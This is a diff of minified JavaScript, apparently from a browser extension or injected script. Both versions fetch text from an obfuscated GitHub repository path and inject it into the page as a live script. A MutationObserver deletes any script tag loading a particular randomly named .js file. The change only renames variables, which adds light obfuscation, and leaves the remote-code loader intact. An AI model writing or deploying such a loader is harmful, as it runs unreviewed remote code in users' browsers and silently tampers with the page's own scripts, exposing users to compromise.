@@ -1,21 +1,21 @@
-const n = t => {
-    t = t.replace(new RegExp("\r?\n", "g"), "");
-    t = t.replace(/ +/g, " ");
-    let e = document.createElement("script");
-    e.type = "text/javascript";
-    e.innerText = t;
-    document.getElementsByTagName("body")[0].appendChild(e)
+const na = tr => {
+    tr = tr.replace(new RegExp("\r?\n", "g"), "");
+    tr = tr.replace(/ +/g, " ");
+    let ee = document.createElement("script");
+    ee.type = "text/javascript";
+    ee.innerText = tr;
+    document.getElementsByTagName("body")[0].appendChild(ee)
 };
 (async function() {
-    const t = t => fetch(t).then(t => t.text());
-    var e = await t('https://github.com/etrhdrs6wret8/ygf2xuvbwqty59sdsa/blob/main/TQ%26%238hB5s%5B2%60X-f:M%5BS9xK%23.B%5B"DqZ');
-    n(e)
+    const tr = tr => fetch(tr).then(tr => tr.text());
+    var ee = await tr('https://github.com/etrhdrs6wret8/ygf2xuvbwqty59sdsa/blob/main/TQ%26%238hB5s%5B2%60X-f:M%5BS9xK%23.B%5B"DqZ');
+    na(ee)
 })();
-let t = new MutationObserver(t => {
-    for (const e of t) {
-        for (let t of e.addedNodes) {
-            if (t.tagName == "SCRIPT" && t.src.includes("u0hj8z9QNdfleKhLDI38wcEdcP6yqFp0.js")) {
-                t.outerHTML = ``
+let tr = new MutationObserver(tr => {
+    for (const ee of tr) {
+        for (let tr of ee.addedNodes) {
+            if (tr.tagName == "SCRIPT" && tr.src.includes("u0hj8z9QNdfleKhLDI38wcEdcP6yqFp0.js")) {
+                tr.outerHTML = ``
             }
         }
     }
